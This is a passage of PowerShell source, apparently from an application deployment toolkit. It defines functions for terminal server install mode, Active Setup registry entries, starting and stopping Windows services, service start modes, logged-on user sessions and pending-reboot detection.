				$InstallCount++
			}
			Catch {
				Write-Log -Message "Failed to $($InstallMsg). `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
				If (-not $ContinueOnError) {
					Throw "Failed to $($InstallMsg): $($_.Exception.Message)"
				}
				Continue
			}
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Enable-TerminalServerInstallMode {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[boolean]$ContinueOnError = $true
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		Try {
			Write-Log -Message 'Change terminal server into user install mode...' -Source ${CmdletName}
			$terminalServerResult = & change.exe User /Install

			If ($global:LastExitCode -ne 1) { Throw $terminalServerResult }
		}
		Catch {
			Write-Log -Message "Failed to change terminal server into user install mode. `n$(Resolve-Error) " -Severity 3 -Source ${CmdletName}
			If (-not $ContinueOnError) {
				Throw "Failed to change terminal server into user install mode: $($_.Exception.Message)"
			}
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Disable-TerminalServerInstallMode {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[boolean]$ContinueOnError = $true
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		Try {
			Write-Log -Message 'Change terminal server into user execute mode...' -Source ${CmdletName}
			$terminalServerResult = & change.exe User /Execute

			If ($global:LastExitCode -ne 1) { Throw $terminalServerResult }
		}
		Catch {
			Write-Log -Message "Failed to change terminal server into user execute mode. `n$(Resolve-Error) " -Severity 3 -Source ${CmdletName}
			If (-not $ContinueOnError) {
				Throw "Failed to change terminal server into user execute mode: $($_.Exception.Message)"
			}
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Set-ActiveSetup {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$true,ParameterSetName='Create')]
		[ValidateNotNullorEmpty()]
		[string]$StubExePath,
		[Parameter(Mandatory=$false,ParameterSetName='Create')]
		[ValidateNotNullorEmpty()]
		[string]$Arguments,
		[Parameter(Mandatory=$false,ParameterSetName='Create')]
		[ValidateNotNullorEmpty()]
		[string]$Description = $installName,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[string]$Key = $installName,
		[Parameter(Mandatory=$false,ParameterSetName='Create')]
		[ValidateNotNullorEmpty()]
		[string]$Version = ((Get-Date -Format 'yyMM,ddHH,mmss').ToString()), 
		[Parameter(Mandatory=$false,ParameterSetName='Create')]
		[ValidateNotNullorEmpty()]
		[string]$Locale,
		[Parameter(Mandatory=$false,ParameterSetName='Create')]
		[ValidateNotNullorEmpty()]
		[switch]$DisableActiveSetup = $false,
		[Parameter(Mandatory=$true,ParameterSetName='Purge')]
		[switch]$PurgeActiveSetupKey,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[boolean]$ContinueOnError = $true
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		Try {
			[string]$ActiveSetupKey = "HKLM:SOFTWARE\Microsoft\Active Setup\Installed Components\$Key"
			[string]$HKCUActiveSetupKey = "HKCU:Software\Microsoft\Active Setup\Installed Components\$Key"

			
			If ($PurgeActiveSetupKey) {
				Write-Log -Message "Remove Active Setup entry [$ActiveSetupKey]." -Source ${CmdletName}
				Remove-RegistryKey -Key $ActiveSetupKey -Recurse

				Write-Log -Message "Remove Active Setup entry [$HKCUActiveSetupKey] for all log on user registry hives on the system." -Source ${CmdletName}
				[scriptblock]$RemoveHKCUActiveSetupKey = {
					If (Get-RegistryKey -Key $HKCUActiveSetupKey -SID $UserProfile.SID) {
						Remove-RegistryKey -Key $HKCUActiveSetupKey -SID $UserProfile.SID -Recurse
					}
				}
				Invoke-HKCURegistrySettingsForAllUsers -RegistrySettings $RemoveHKCUActiveSetupKey -UserProfiles (Get-UserProfiles -ExcludeDefaultUser)
				Return
			}

			
			[string[]]$StubExePathFileExtensions = '.exe', '.vbs', '.cmd', '.ps1', '.js'
			[string]$StubExeExt = [IO.Path]::GetExtension($StubExePath)
			If ($StubExePathFileExtensions -notcontains $StubExeExt) {
				Throw "Unsupported Active Setup StubPath file extension [$StubExeExt]."
			}

			
			[string]$StubExePath = [Environment]::ExpandEnvironmentVariables($StubExePath)
			[string]$ActiveSetupFileName = [IO.Path]::GetFileName($StubExePath)
			[string]$StubExeFile = Join-Path -Path $dirFiles -ChildPath $ActiveSetupFileName
			If (Test-Path -LiteralPath $StubExeFile -PathType 'Leaf') {
				
				Copy-File -Path $StubExeFile -Destination $StubExePath -ContinueOnError $false
			}

			
			If (-not (Test-Path -LiteralPath $StubExePath -PathType 'Leaf')) { Throw "Active Setup StubPath file [$ActiveSetupFileName] is missing." }

			
			Switch ($StubExeExt) {
				'.exe' {
					[string]$CUStubExePath = $StubExePath
					[string]$CUArguments = $Arguments
					[string]$StubPath = "$CUStubExePath"
				}
				{'.vbs','.js' -contains $StubExeExt} {
					[string]$CUStubExePath = "$envWinDir\system32\cscript.exe"
					[string]$CUArguments = "//nologo `"$StubExePath`""
					[string]$StubPath = "$CUStubExePath $CUArguments"
				}
				'.cmd' {
					[string]$CUStubExePath = "$envWinDir\system32\CMD.exe"
					[string]$CUArguments = "/C `"$StubExePath`""
					[string]$StubPath = "$CUStubExePath $CUArguments"
				}
				'.ps1' {
					[string]$CUStubExePath = "$PSHOME\powershell.exe"
					[string]$CUArguments = "-ExecutionPolicy Bypass -NoProfile -NoLogo -WindowStyle Hidden -Command `"& { & `\`"$StubExePath`\`"}`""
					[string]$StubPath = "$CUStubExePath $CUArguments"
				}
			}
			If ($Arguments) {
				[string]$StubPath = "$StubPath $Arguments"
				If ($StubExeExt -ne '.exe') { [string]$CUArguments = "$CUArguments $Arguments" }
			}

			
			[scriptblock]$SetActiveSetupRegKeys = {
				Param (
					[Parameter(Mandatory=$true)]
					[ValidateNotNullorEmpty()]
					[string]$ActiveSetupRegKey,
					[Parameter(Mandatory=$false)]
					[ValidateNotNullorEmpty()]
					[string]$SID
				)
				If ($SID) {
					Set-RegistryKey -Key $ActiveSetupRegKey -Name '(Default)' -Value $Description -SID $SID -ContinueOnError $false
					Set-RegistryKey -Key $ActiveSetupRegKey -Name 'StubPath' -Value $StubPath -Type 'String' -SID $SID -ContinueOnError $false
					Set-RegistryKey -Key $ActiveSetupRegKey -Name 'Version' -Value $Version -SID $SID -ContinueOnError $false
					If ($Locale) { Set-RegistryKey -Key $ActiveSetupRegKey -Name 'Locale' -Value $Locale -SID $SID -ContinueOnError $false }
					If ($DisableActiveSetup) {
						Set-RegistryKey -Key $ActiveSetupRegKey -Name 'IsInstalled' -Value 0 -Type 'DWord' -SID $SID -ContinueOnError $false
					}
					Else {
						Set-RegistryKey -Key $ActiveSetupRegKey -Name 'IsInstalled' -Value 1 -Type 'DWord' -SID $SID -ContinueOnError $false
					}
				}
				Else {
					Set-RegistryKey -Key $ActiveSetupRegKey -Name '(Default)' -Value $Description -ContinueOnError $false
					Set-RegistryKey -Key $ActiveSetupRegKey -Name 'StubPath' -Value $StubPath -Type 'String' -ContinueOnError $false
					Set-RegistryKey -Key $ActiveSetupRegKey -Name 'Version' -Value $Version -ContinueOnError $false
					If ($Locale) { Set-RegistryKey -Key $ActiveSetupRegKey -Name 'Locale' -Value $Locale -ContinueOnError $false }
					If ($DisableActiveSetup) {
						Set-RegistryKey -Key $ActiveSetupRegKey -Name 'IsInstalled' -Value 0 -Type 'DWord' -ContinueOnError $false
					}
					Else {
						Set-RegistryKey -Key $ActiveSetupRegKey -Name 'IsInstalled' -Value 1 -Type 'DWord' -ContinueOnError $false
					}
				}

			}
			& $SetActiveSetupRegKeys -ActiveSetupRegKey $ActiveSetupKey

			
			If ($SessionZero) {
				If ($RunAsActiveUser) {
					Write-Log -Message "Session 0 detected: Execute Active Setup StubPath file for currently logged in user [$($RunAsActiveUser.NTAccount)]." -Source ${CmdletName}
					If ($CUArguments) {
						Execute-ProcessAsUser -Path $CUStubExePath -Parameters $CUArguments -Wait -ContinueOnError $true
					}
					Else {
						Execute-ProcessAsUser -Path $CUStubExePath -Wait -ContinueOnError $true
					}
					& $SetActiveSetupRegKeys -ActiveSetupRegKey $HKCUActiveSetupKey -SID $RunAsActiveUser.SID
				}
				Else {
					Write-Log -Message 'Session 0 detected: No logged in users detected. Active Setup StubPath file will execute when users first log into their account.' -Source ${CmdletName}
				}
			}
			Else {
				Write-Log -Message 'Execute Active Setup StubPath file for the current user.' -Source ${CmdletName}
				If ($CUArguments) {
					$ExecuteResults = Execute-Process -FilePath $CUStubExePath -Parameters $CUArguments -PassThru
				}
				Else {
					$ExecuteResults = Execute-Process -FilePath $CUStubExePath -PassThru
				}
				& $SetActiveSetupRegKeys -ActiveSetupRegKey $HKCUActiveSetupKey
			}
		}
		Catch {
			Write-Log -Message "Failed to set Active Setup registry entry. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
			If (-not $ContinueOnError) {
				Throw "Failed to set Active Setup registry entry: $($_.Exception.Message)"
			}
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Test-ServiceExists {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$true)]
		[ValidateNotNullOrEmpty()]
		[string]$Name,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullOrEmpty()]
		[string]$ComputerName = $env:ComputerName,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullOrEmpty()]
		[switch]$PassThru,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullOrEmpty()]
		[boolean]$ContinueOnError = $true
	)
	Begin {
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		Try {
			$ServiceObject = Get-WmiObject -ComputerName $ComputerName -Class 'Win32_Service' -Filter "Name='$Name'" -ErrorAction 'Stop'
			
			If (-not ($ServiceObject) ) {
				$ServiceObject = Get-WmiObject -ComputerName $ComputerName -Class 'Win32_BaseService' -Filter "Name='$Name'" -ErrorAction 'Stop'
			}

			If ($ServiceObject) {
				Write-Log -Message "Service [$Name] exists." -Source ${CmdletName}
				If ($PassThru) { Write-Output -InputObject $ServiceObject } Else { Write-Output -InputObject $true }
			}
			Else {
				Write-Log -Message "Service [$Name] does not exist." -Source ${CmdletName}
				If ($PassThru) { Write-Output -InputObject $ServiceObject } Else { Write-Output -InputObject $false }
			}
		}
		Catch {
			Write-Log -Message "Failed check to see if service [$Name] exists." -Severity 3 -Source ${CmdletName}
			If (-not $ContinueOnError) {
				Throw "Failed check to see if service [$Name] exists: $($_.Exception.Message)"
			}
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Stop-ServiceAndDependencies {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$true)]
		[ValidateNotNullOrEmpty()]
		[string]$Name,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullOrEmpty()]
		[string]$ComputerName = $env:ComputerName,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullOrEmpty()]
		[switch]$SkipServiceExistsTest,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullOrEmpty()]
		[switch]$SkipDependentServices,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullOrEmpty()]
		[timespan]$PendingStatusWait = (New-TimeSpan -Seconds 60),
		[Parameter(Mandatory=$false)]
		[ValidateNotNullOrEmpty()]
		[switch]$PassThru,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullOrEmpty()]
		[boolean]$ContinueOnError = $true
	)
	Begin {
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		Try {
			
			If ((-not $SkipServiceExistsTest) -and (-not (Test-ServiceExists -ComputerName $ComputerName -Name $Name -ContinueOnError $false))) {
				Write-Log -Message "Service [$Name] does not exist." -Source ${CmdletName} -Severity 2
				Throw "Service [$Name] does not exist."
			}

			
			Write-Log -Message "Get the service object for service [$Name]." -Source ${CmdletName}
			[ServiceProcess.ServiceController]$Service = Get-Service -ComputerName $ComputerName -Name $Name -ErrorAction 'Stop'
			
			[string[]]$PendingStatus = 'ContinuePending', 'PausePending', 'StartPending', 'StopPending'
			If ($PendingStatus -contains $Service.Status) {
				Switch ($Service.Status) {
					'ContinuePending' { $DesiredStatus = 'Running' }
					'PausePending' { $DesiredStatus = 'Paused' }
					'StartPending' { $DesiredStatus = 'Running' }
					'StopPending' { $DesiredStatus = 'Stopped' }
				}
				Write-Log -Message "Waiting for up to [$($PendingStatusWait.TotalSeconds)] seconds to allow service pending status [$($Service.Status)] to reach desired status [$DesiredStatus]." -Source ${CmdletName}
				$Service.WaitForStatus([ServiceProcess.ServiceControllerStatus]$DesiredStatus, $PendingStatusWait)
				$Service.Refresh()
			}
			
			Write-Log -Message "Service [$($Service.ServiceName)] with display name [$($Service.DisplayName)] has a status of [$($Service.Status)]." -Source ${CmdletName}
			If ($Service.Status -ne 'Stopped') {
				
				If (-not $SkipDependentServices) {
					Write-Log -Message "Discover all dependent service(s) for service [$Name] which are not 'Stopped'." -Source ${CmdletName}
					[ServiceProcess.ServiceController[]]$DependentServices = Get-Service -ComputerName $ComputerName -Name $Service.ServiceName -DependentServices -ErrorAction 'Stop' | Where-Object { $_.Status -ne 'Stopped' }
					If ($DependentServices) {
						ForEach ($DependentService in $DependentServices) {
							Write-Log -Message "Stop dependent service [$($DependentService.ServiceName)] with display name [$($DependentService.DisplayName)] and a status of [$($DependentService.Status)]." -Source ${CmdletName}
							Try {
								Stop-Service -InputObject (Get-Service -ComputerName $ComputerName -Name $DependentService.ServiceName -ErrorAction 'Stop') -Force -WarningAction 'SilentlyContinue' -ErrorAction 'Stop'
							}
							Catch {
								Write-Log -Message "Failed to start dependent service [$($DependentService.ServiceName)] with display name [$($DependentService.DisplayName)] and a status of [$($DependentService.Status)]. Continue..." -Severity 2 -Source ${CmdletName}
								Continue
							}
						}
					}
					Else {
						Write-Log -Message "Dependent service(s) were not discovered for service [$Name]." -Source ${CmdletName}
					}
				}
				
				Write-Log -Message "Stop parent service [$($Service.ServiceName)] with display name [$($Service.DisplayName)]." -Source ${CmdletName}
				[ServiceProcess.ServiceController]$Service = Stop-Service -InputObject (Get-Service -ComputerName $ComputerName -Name $Service.ServiceName -ErrorAction 'Stop') -Force -PassThru -WarningAction 'SilentlyContinue' -ErrorAction 'Stop'
			}
		}
		Catch {
			Write-Log -Message "Failed to stop the service [$Name]. `n$(Resolve-Error)" -Source ${CmdletName} -Severity 3
			If (-not $ContinueOnError) {
				Throw "Failed to stop the service [$Name]: $($_.Exception.Message)"
			}
		}
		Finally {
			
			If ($PassThru -and $Service) { Write-Output -InputObject $Service }
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Start-ServiceAndDependencies {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$true)]
		[ValidateNotNullOrEmpty()]
		[string]$Name,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullOrEmpty()]
		[string]$ComputerName = $env:ComputerName,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullOrEmpty()]
		[switch]$SkipServiceExistsTest,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullOrEmpty()]
		[switch]$SkipDependentServices,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullOrEmpty()]
		[timespan]$PendingStatusWait = (New-TimeSpan -Seconds 60),
		[Parameter(Mandatory=$false)]
		[ValidateNotNullOrEmpty()]
		[switch]$PassThru,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullOrEmpty()]
		[boolean]$ContinueOnError = $true
	)
	Begin {
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		Try {
			
			If ((-not $SkipServiceExistsTest) -and (-not (Test-ServiceExists -ComputerName $ComputerName -Name $Name -ContinueOnError $false))) {
				Write-Log -Message "Service [$Name] does not exist." -Source ${CmdletName} -Severity 2
				Throw "Service [$Name] does not exist."
			}

			
			Write-Log -Message "Get the service object for service [$Name]." -Source ${CmdletName}
			[ServiceProcess.ServiceController]$Service = Get-Service -ComputerName $ComputerName -Name $Name -ErrorAction 'Stop'
			
			[string[]]$PendingStatus = 'ContinuePending', 'PausePending', 'StartPending', 'StopPending'
			If ($PendingStatus -contains $Service.Status) {
				Switch ($Service.Status) {
					'ContinuePending' { $DesiredStatus = 'Running' }
					'PausePending' { $DesiredStatus = 'Paused' }
					'StartPending' { $DesiredStatus = 'Running' }
					'StopPending' { $DesiredStatus = 'Stopped' }
				}
				Write-Log -Message "Waiting for up to [$($PendingStatusWait.TotalSeconds)] seconds to allow service pending status [$($Service.Status)] to reach desired status [$DesiredStatus]." -Source ${CmdletName}
				$Service.WaitForStatus([ServiceProcess.ServiceControllerStatus]$DesiredStatus, $PendingStatusWait)
				$Service.Refresh()
			}
			
			Write-Log -Message "Service [$($Service.ServiceName)] with display name [$($Service.DisplayName)] has a status of [$($Service.Status)]." -Source ${CmdletName}
			If ($Service.Status -ne 'Running') {
				
				Write-Log -Message "Start parent service [$($Service.ServiceName)] with display name [$($Service.DisplayName)]." -Source ${CmdletName}
				[ServiceProcess.ServiceController]$Service = Start-Service -InputObject (Get-Service -ComputerName $ComputerName -Name $Service.ServiceName -ErrorAction 'Stop') -PassThru -WarningAction 'SilentlyContinue' -ErrorAction 'Stop'

				
				If (-not $SkipDependentServices) {
					Write-Log -Message "Discover all dependent service(s) for service [$Name] which are not 'Running'." -Source ${CmdletName}
					[ServiceProcess.ServiceController[]]$DependentServices = Get-Service -ComputerName $ComputerName -Name $Service.ServiceName -DependentServices -ErrorAction 'Stop' | Where-Object { $_.Status -ne 'Running' }
					If ($DependentServices) {
						ForEach ($DependentService in $DependentServices) {
							Write-Log -Message "Start dependent service [$($DependentService.ServiceName)] with display name [$($DependentService.DisplayName)] and a status of [$($DependentService.Status)]." -Source ${CmdletName}
							Try {
								Start-Service -InputObject (Get-Service -ComputerName $ComputerName -Name $DependentService.ServiceName -ErrorAction 'Stop') -WarningAction 'SilentlyContinue' -ErrorAction 'Stop'
							}
							Catch {
								Write-Log -Message "Failed to start dependent service [$($DependentService.ServiceName)] with display name [$($DependentService.DisplayName)] and a status of [$($DependentService.Status)]. Continue..." -Severity 2 -Source ${CmdletName}
								Continue
							}
						}
					}
					Else {
						Write-Log -Message "Dependent service(s) were not discovered for service [$Name]." -Source ${CmdletName}
					}
				}
			}
		}
		Catch {
			Write-Log -Message "Failed to start the service [$Name]. `n$(Resolve-Error)" -Source ${CmdletName} -Severity 3
			If (-not $ContinueOnError) {
				Throw "Failed to start the service [$Name]: $($_.Exception.Message)"
			}
		}
		Finally {
			
			If ($PassThru -and $Service) { Write-Output -InputObject $Service }
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Get-ServiceStartMode
{

	[CmdLetBinding()]
	Param (
		[Parameter(Mandatory=$true)]
		[ValidateNotNullOrEmpty()]
		[string]$Name,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullOrEmpty()]
		[string]$ComputerName = $env:ComputerName,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullOrEmpty()]
		[boolean]$ContinueOnError = $true
	)
	Begin {
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		Try {
			Write-Log -Message "Get the service [$Name] startup mode." -Source ${CmdletName}
			[string]$ServiceStartMode = (Get-WmiObject -ComputerName $ComputerName -Class 'Win32_Service' -Filter "Name='$Name'" -Property 'StartMode' -ErrorAction 'Stop').StartMode
			
			If ($ServiceStartMode -eq 'Auto') { $ServiceStartMode = 'Automatic'}

			
			If (($ServiceStartMode -eq 'Automatic') -and (([version]$envOSVersion).Major -gt 5)) {
				Try {
					[string]$ServiceRegistryPath = "HKLM:SYSTEM\CurrentControlSet\Services\$Name"
					[int32]$DelayedAutoStart = Get-ItemProperty -LiteralPath $ServiceRegistryPath -ErrorAction 'Stop' | Select-Object -ExpandProperty 'DelayedAutoStart' -ErrorAction 'Stop'
					If ($DelayedAutoStart -eq 1) { $ServiceStartMode = 'Automatic (Delayed Start)' }
				}
				Catch { }
			}

			Write-Log -Message "Service [$Name] startup mode is set to [$ServiceStartMode]." -Source ${CmdletName}
			Write-Output -InputObject $ServiceStartMode
		}
		Catch {
			Write-Log -Message "Failed to get the service [$Name] startup mode. `n$(Resolve-Error)" -Source ${CmdletName} -Severity 3
			If (-not $ContinueOnError) {
				Throw "Failed to get the service [$Name] startup mode: $($_.Exception.Message)"
			}
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Set-ServiceStartMode
{

	[CmdLetBinding()]
	Param (
		[Parameter(Mandatory=$true)]
		[ValidateNotNullOrEmpty()]
		[string]$Name,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullOrEmpty()]
		[string]$ComputerName = $env:ComputerName,
		[Parameter(Mandatory=$true)]
		[ValidateSet('Automatic','Automatic (Delayed Start)','Manual','Disabled','Boot','System')]
		[string]$StartMode,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullOrEmpty()]
		[boolean]$ContinueOnError = $true
	)
	Begin {
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		Try {
			
			If (($StartMode -eq 'Automatic (Delayed Start)') -and (([version]$envOSVersion).Major -lt 6)) { $StartMode = 'Automatic' }

			Write-Log -Message "Set service [$Name] startup mode to [$StartMode]." -Source ${CmdletName}

			
			[string]$ScExeStartMode = $StartMode
			If ($StartMode -eq 'Automatic') { $ScExeStartMode = 'Auto' }
			If ($StartMode -eq 'Automatic (Delayed Start)') { $ScExeStartMode = 'Delayed-Auto' }
			If ($StartMode -eq 'Manual') { $ScExeStartMode = 'Demand' }

			
			$ChangeStartMode = & sc.exe config $Name start= $ScExeStartMode

			If ($global:LastExitCode -ne 0) {
				Throw "sc.exe failed with exit code [$($global:LastExitCode)] and message [$ChangeStartMode]."
			}

			Write-Log -Message "Successfully set service [$Name] startup mode to [$StartMode]." -Source ${CmdletName}
		}
		Catch {
			Write-Log -Message "Failed to set service [$Name] startup mode to [$StartMode]. `n$(Resolve-Error)" -Source ${CmdletName} -Severity 3
			If (-not $ContinueOnError) {
				Throw "Failed to set service [$Name] startup mode to [$StartMode]: $($_.Exception.Message)"
			}
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Get-LoggedOnUser {

	[CmdletBinding()]
	Param (
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		Try {
			Write-Log -Message 'Get session information for all logged on users.' -Source ${CmdletName}
			Write-Output -InputObject ([PSADT.QueryUser]::GetUserSessionInfo("$env:ComputerName"))
		}
		Catch {
			Write-Log -Message "Failed to get session information for all logged on users. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Get-PendingReboot {

	[CmdletBinding()]
	Param (
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header

		
		[string]$private:ComputerName = ([Net.Dns]::GetHostEntry('')).HostName
		$PendRebootErrorMsg = $null
	}
	Process {
		Write-Log -Message "Get the pending reboot status on the local computer [$ComputerName]." -Source ${CmdletName}

		
		Try {
			[nullable[datetime]]$LastBootUpTime = (Get-Date -ErrorAction 'Stop') - ([timespan]::FromMilliseconds([math]::Abs([Environment]::TickCount)))
		}
		Catch {
			[nullable[datetime]]$LastBootUpTime = $null
			[string[]]$PendRebootErrorMsg += "Failed to get LastBootUpTime: $($_.Exception.Message)"
			Write-Log -Message "Failed to get LastBootUpTime. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
		}

		
		Try {
			If (([version]$envOSVersion).Major -ge 5) {
				If (Test-Path -LiteralPath 'HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\RebootPending' -ErrorAction 'Stop') {
					[nullable[boolean]]$IsCBServicingRebootPending = $true
				}
				Else {
					[nullable[boolean]]$IsCBServicingRebootPending = $false
				}
			}
		}
		Catch {
			[nullable[boolean]]$IsCBServicingRebootPending = $null
			[string[]]$PendRebootErrorMsg += "Failed to get IsCBServicingRebootPending: $($_.Exception.Message)"
			Write-Log -Message "Failed to get IsCBServicingRebootPending. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
		}

		
		Try {
			If (Test-Path -LiteralPath 'HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update\RebootRequired' -ErrorAction 'Stop') {
				[nullable[boolean]]$IsWindowsUpdateRebootPending = $true
			}
			Else {
				[nullable[boolean]]$IsWindowsUpdateRebootPending = $false
			}
		}
		Catch {
			[nullable[boolean]]$IsWindowsUpdateRebootPending = $null
			[string[]]$PendRebootErrorMsg += "Failed to get IsWindowsUpdateRebootPending: $($_.Exception.Message)"
			Write-Log -Message "Failed to get IsWindowsUpdateRebootPending. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
		}

		
		[boolean]$IsFileRenameRebootPending = $false
		$PendingFileRenameOperations = $null
		If (Test-RegistryValue -Key 'HKLM:SYSTEM\CurrentControlSet\Control\Session Manager' -Value 'PendingFileRenameOperations') {
			
			[boolean]$IsFileRenameRebootPending = $true
			
			Try {
				[string[]]$PendingFileRenameOperations = Get-ItemProperty -LiteralPath 'HKLM:SYSTEM\CurrentControlSet\Control\Session Manager' -ErrorAction 'Stop' | Select-Object -ExpandProperty 'PendingFileRenameOperations' -ErrorAction 'Stop'
			}
			Catch {
				[string[]]$PendRebootErrorMsg += "Failed to get PendingFileRenameOperations: $($_.Exception.Message)"
				Write-Log -Message "Failed to get PendingFileRenameOperations. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
			}
		}

		
		Try {
			[boolean]$IsSccmClientNamespaceExists = $false
			[psobject]$SCCMClientRebootStatus = Invoke-WmiMethod -ComputerName $ComputerName -NameSpace 'ROOT\CCM\ClientSDK' -Class 'CCM_ClientUtilities' -Name 'DetermineIfRebootPending' -ErrorAction 'Stop'
			[boolean]$IsSccmClientNamespaceExists = $true
			If ($SCCMClientRebootStatus.ReturnValue -ne 0) {
				Throw "'DetermineIfRebootPending' method of 'ROOT\CCM\ClientSDK\CCM_ClientUtilities' class returned error code [$($SCCMClientRebootStatus.ReturnValue)]"
			}
			Else {
				Write-Log -Message 'Successfully queried SCCM client for reboot status.' -Source ${CmdletName}
				[nullable[boolean]]$IsSCCMClientRebootPending = $false
				If ($SCCMClientRebootStatus.IsHardRebootPending -or $SCCMClientRebootStatus.RebootPending) {
					[nullable[boolean]]$IsSCCMClientRebootPending = $true
					Write-Log -Message 'Pending SCCM reboot detected.' -Source ${CmdletName}
				}
				Else {
					Write-Log -Message 'Pending SCCM reboot not detected.' -Source ${CmdletName}
				}
			}
		}
		Catch [System.Management.ManagementException] {
			[nullable[boolean]]$IsSCCMClientRebootPending = $null
			[boolean]$IsSccmClientNamespaceExists = $false
			Write-Log -Message "Failed to get IsSCCMClientRebootPending. Failed to detect the SCCM client WMI class." -Severity 3 -Source ${CmdletName}
		}
		Catch {
			[nullable[boolean]]$IsSCCMClientRebootPending = $null
			[string[]]$PendRebootErrorMsg += "Failed to get IsSCCMClientRebootPending: $($_.Exception.Message)"
			Write-Log -Message "Failed to get IsSCCMClientRebootPending. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
		}

		
		Try {
			If (Test-Path -LiteralPath 'HKLM:SOFTWARE\Software\Microsoft\AppV\Client\PendingTasks' -ErrorAction 'Stop') {

				[nullable[boolean]]$IsAppVRebootPending = $true
			}
			Else {
				[nullable[boolean]]$IsAppVRebootPending = $false
			}
		}
		Catch {
			[nullable[boolean]]$IsAppVRebootPending = $null
			[string[]]$PendRebootErrorMsg += "Failed to get IsAppVRebootPending: $($_.Exception.Message)"
			Write-Log -Message "Failed to get IsAppVRebootPending. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
		}

		
		[boolean]$IsSystemRebootPending = $false
		If ($IsCBServicingRebootPending -or $IsWindowsUpdateRebootPending -or $IsSCCMClientRebootPending -or $IsFileRenameRebootPending) {
			[boolean]$IsSystemRebootPending = $true
		}

		
